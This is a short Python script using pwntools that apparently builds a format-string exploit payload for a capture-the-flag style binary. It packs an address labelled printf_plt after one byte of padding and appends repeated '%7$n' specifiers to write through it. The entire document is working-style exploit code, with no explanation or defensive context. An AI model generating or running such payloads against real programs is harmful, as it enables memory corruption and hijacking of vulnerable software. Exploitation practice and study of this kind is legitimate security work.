import struct
from pwn import *

printf_plt = 0x5655900c
payload = "A"
payload += struct.pack("I", printf_plt)
payload += "%7$n "*4
print(payload)
